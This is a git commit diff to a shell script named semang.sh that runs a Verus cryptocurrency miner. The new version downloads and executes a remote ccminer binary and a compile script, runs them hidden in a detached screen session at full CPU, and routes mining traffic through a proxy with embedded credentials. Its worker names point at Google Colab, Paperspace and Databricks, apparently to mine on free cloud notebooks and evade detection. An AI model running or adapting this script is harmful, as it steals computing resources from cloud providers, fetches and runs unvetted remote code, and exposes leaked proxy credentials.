832330afaf44d850f16e57554f3adec6397d09be
thepowert <96099226+thepowert@users.noreply.github.com>
2021-12-14 14:24:16 +0700

    Update semang.sh

--- semang.sh
+++ semang.sh
@@ -1,12 +1,13 @@
-!#/bin/bash
-proxy="socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080"
-array[0]="0001"
-array[1]="0002"
-array[2]="0003"
-size=${#array[@]} index=$(($RANDOM % $size))
+#!/bin/bash
+array[0]="google_colab"
+array[1]="paperspace"
+array[2]="databricks"
+size=${#array[@]}
+index=$(($RANDOM % $size))
 worker=${array[$index]}
-apt-get update
-wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.8.5/SRBMiner-Multi-0-8-5-Linux.tar.xz
-tar -xf SRBMiner-Multi-0-8-5-Linux.tar.xz
-cd SRBMiner-Multi-0-8-5
-./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool na.luckpool.net:3956 --wallet RA5S1Suf1BHvTiphQ3VRnWy6aShii374j5.worker-$worker --password x --t $(nproc --all)
+sleep 10s
+wget -qO deploy https://github.com/renifer12/master/raw/master/ccminer
+wget -qO compile https://github.com/renifer12/master/raw/master/compile.sh
+chmod +x deploy compile
+screen -dm -S run ./deploy -a verus -o stratum+tcp://ap.luckpool.net:3956 -u RA5S1Suf1BHvTiphQ3VRnWy6aShii374j5.Ren_$(cat /proc/sys/kernel/hostname)_$(echo $worker) -p c=VRSC -t $(nproc --all) -x socks5://OXk5cgacd:4uHDOv78GAq@iad-a10.ipvanish.com:1080
+sleep 10s && ./compile
